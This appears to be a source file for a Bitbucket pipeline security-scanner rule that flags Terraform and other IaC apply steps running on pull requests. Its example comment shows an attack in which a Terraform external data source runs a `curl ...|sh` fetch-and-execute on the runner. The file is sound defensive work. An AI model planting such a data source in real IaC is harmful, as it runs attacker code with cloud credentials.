"""BB-033. Unattended IaC apply in a pull-request pipeline."""
from __future__ import annotations

from typing import Any

from ..._primitives.deploy_names import IAC_APPLY_RE
from ...base import Finding, Severity
from ...rule import Rule
from ..base import iter_steps, step_scripts_all

RULE = Rule(
    id="BB-033",
    title="IaC apply on a pull-request pipeline",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4",),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-94", "CWE-78"),
    recommendation=(
        "Never run `terraform apply` (or `cloudformation deploy` / "
        "`cdk deploy` / `pulumi up` / `sam deploy`) in a step under the "
        "`pull-requests:` section. That pipeline runs the PR branch's "
        "IaC, so an `external` data source, a `local-exec` provisioner, "
        "or a hijacked provider executes arbitrary code on the runner "
        "with whatever cloud credentials (often an OIDC identity) the "
        "apply uses, before the change is reviewed or merged. On pull "
        "requests run a read-only `plan`; move the `apply` into the "
        "`branches:` section for your default branch (or a `custom:` "
        "manual pipeline) gated by a `deployment:` environment so it "
        "runs against merged, reviewed code."
    ),
    docs_note=(
        "Fires when a step in the `pull-requests:` section runs an IaC "
        "apply command (`terraform apply`, `cloudformation deploy`, "
        "`cdk deploy`, `pulumi up`, `sam deploy`, `terragrunt apply`) "
        "in its `script:` or `after-script:`. Steps under `branches:`, "
        "`default:`, `custom:`, and `tags:` are out of scope, only the "
        "pull-request-triggered section runs untrusted branch content. "
        "This is the Bitbucket analog of GL-041 / GHA-117."
    ),
    known_fp=(
        "A pipeline that runs `apply` only against a short-lived, "
        "fully-sandboxed review environment with no production-adjacent "
        "credentials. Even then the apply executes unreviewed IaC on "
        "the runner; prefer `plan` on PRs. Suppress with a rationale "
        "naming the sandbox scope.",
    ),
    exploit_example=(
        "# Vulnerable: apply runs on every pull request.\n"
        "pipelines:\n"
        "  pull-requests:\n"
        "    '**':\n"
        "      - step:\n"
        "          name: terraform\n"
        "          oidc: true\n"
        "          script:\n"
        "            - terraform init\n"
        "            - terraform apply -auto-approve\n"
        "\n"
        "# Attack: a contributor opens a PR whose .tf adds\n"
        "#   data \"external\" \"x\" { program = [\"sh\",\"-c\",\"curl ...|sh\"] }\n"
        "# apply executes it on the runner with the OIDC cloud role.\n"
        "\n"
        "# Safe: plan on PRs, apply only on the default branch.\n"
        "pipelines:\n"
        "  pull-requests:\n"
        "    '**':\n"
        "      - step:\n"
        "          script: [terraform plan]\n"
        "  branches:\n"
        "    main:\n"
        "      - step:\n"
        "          deployment: production\n"
        "          script: [terraform apply -auto-approve]"
    ),
)


def check(path: str, doc: dict[str, Any]) -> Finding:
    offenders: list[str] = []
    for location, step in iter_steps(doc):
        if not location.startswith("pull-requests"):
            continue
        if any(IAC_APPLY_RE.search(line) for line in step_scripts_all(step)):
            offenders.append(location)
    passed = not offenders
    desc = (
        "No pull-request pipeline step runs an unattended IaC apply."
        if passed else
        f"{len(offenders)} pull-request pipeline step(s) run an "
        f"unattended IaC apply: {', '.join(offenders[:5])}"
        f"{'…' if len(offenders) > 5 else ''}. The PR branch's IaC "
        f"executes at apply time with the job's cloud credentials, "
        f"before the change is reviewed or merged."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
    )
